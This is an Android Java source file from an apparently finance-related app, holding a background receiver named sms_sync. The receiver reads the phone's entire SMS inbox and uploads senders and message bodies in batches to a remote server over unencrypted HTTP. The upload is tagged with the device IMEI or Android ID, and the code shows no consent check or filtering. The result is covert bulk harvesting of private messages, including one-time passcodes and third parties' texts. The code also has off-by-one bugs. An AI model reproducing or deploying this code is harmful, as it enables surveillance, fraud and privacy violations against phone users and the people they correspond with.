package com.tst.hytonefinance.Background_Service;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.tst.hytonefinance.Database.SMS_data;
import com.tst.hytonefinance.Models.SMS;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class sms_sync extends BroadcastReceiver {
    Context context;
    private String Base_Url = "http://backend.getbridge.in";
    SharedPreferences sharedPreferences;
    private SMS_data sms_data;


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        sharedPreferences = context.getSharedPreferences("com.tst.hytonefinance.Background_Service", Context.MODE_PRIVATE);
        sms_data = new SMS_data(context);

        //**************************** SMS *************************************
        Log.e("Process_status :","SMS Sync started",null);
        SMS_spliterator();
    }

    //------------------ Message List -------------------
    @RequiresApi(api = Build.VERSION_CODES.O)
    @SuppressLint("SimpleDateFormat")
    public ArrayList<SMS> readSMS() {
        ArrayList<SMS> Message_list = new ArrayList<>();

        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        cursor.moveToFirst();


        long L_date = sharedPreferences.getLong("Last_Date", 0);


        for (int i = 0; !cursor.isLast(); i++) {
            if (L_date < Long.parseLong(cursor.getString(4))) {

                SMS temp_data = new SMS();
                temp_data.setDate_time(cursor.getString(4));
                temp_data.setTitle(cursor.getString(0));
                temp_data.setMessage(cursor.getString(12));
                temp_data.setSender(cursor.getString(2));
                Message_list.add(temp_data);
                Boolean check_data_flag = sms_data.Insert_Subject_data(temp_data.getTitle(), temp_data.getSender(), temp_data.getMessage(), temp_data.getDate_time());

                if (!check_data_flag) {
                    //  Toast.makeText(context, "Error", Toast.LENGTH_SHORT).show();
                    break;
                }
            } else {
                break;
            }

            cursor.moveToNext();
        }
        cursor.moveToFirst();
        @SuppressLint("CommitPrefEdits")
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putLong("Last_Date", Long.parseLong(cursor.getString(4)));
        editor.apply();


        //  Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
        cursor.close();


        return Message_list;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void SMS_spliterator() {
        ArrayList<SMS> SMS_List = readSMS();

        JSONArray SMS_list = new JSONArray();
        int i;
        for (i = 1; i < SMS_List.size(); i++) {

            JSONObject temp = new JSONObject();
            try {
                temp.put("tital", SMS_List.get(i - 1).getTitle());
                temp.put("sender", SMS_List.get(i - 1).getSender());
                temp.put("message", SMS_List.get(i - 1).getMessage());
                temp.put("date_time", SMS_List.get(i - 1).getDate_time());

                SMS_list.put(temp);
                if (i % 100 == 0) {
                    sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
                    SMS_list = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }

        }

        if (i % 100 != 0) {
            sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
        }


    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (null != mTelephony.getDeviceId()) deviceId = mTelephony.getDeviceId();
            else {
                deviceId = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }

    //------------------ Sync Function List -------------------
    private void sync_list(JSONArray body_Array, String url, String Array_name) {
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        requestQueue.start();


        try {
            JSONObject Details = new JSONObject();
            Details.put("user", getDeviceIMEI());
            Details.put(Array_name, body_Array);

            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.POST,
                            url,
                            Details,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {

                                    try {
                                        Log.e("SMS_API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
//                                        Log.e("API_Response", response.toString(), null);
//
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                        Log.e("Request_response_catch", e.getMessage(), null);
                                    }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {

                                    NetworkResponse response = error.networkResponse;
                                    if (error instanceof ServerError && response != null) {
                                        String res;
                                        try {
                                            res = new String(response.data,
                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                            Log.e("API_Response_Error 1", res, null);
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        // Now you can use any deserializer to make sense of data
                                    }
                                    Log.e("API_Response_Error", error.getMessage(), null);
                                }
                            }) {
                        @Override
                        public Map<String, String> getHeaders() {
                            HashMap<String, String> headers = new HashMap<>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }
}
